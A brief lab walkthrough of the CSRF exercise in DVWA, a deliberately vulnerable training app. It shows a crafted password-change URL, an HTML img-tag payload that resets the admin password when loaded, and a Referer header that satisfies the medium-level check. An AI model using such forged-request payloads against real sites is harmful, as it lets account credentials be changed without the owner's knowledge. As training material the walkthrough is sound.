LOW

Notice how changing the password required no verification process as it's changed.  Now, look at the URL:

`http://dvwa.local/vulnerabilities/csrf/?password_new=newpassword&password_conf=newpassword&Change=Change#`

If we can get the "admin" user to visit the malicious URL, the password will be changed to whatever we want. We don't need to actually type in anything to the vulnerable form.

Save the following as an html file, open in browser, and now the DVWA creds have changed from `admin:password` to `admin:newpassword`
```html
<img src="http://dvwa.local/vulnerabilities/csrf/?password_new=newpassword&password_conf=newpassword&Change=Change#">/img>
```

MEDIUM

Same as low, except we need to add a header in the request:

Referer:  `http://dvwa.local/vulnerabilities/csrf/`
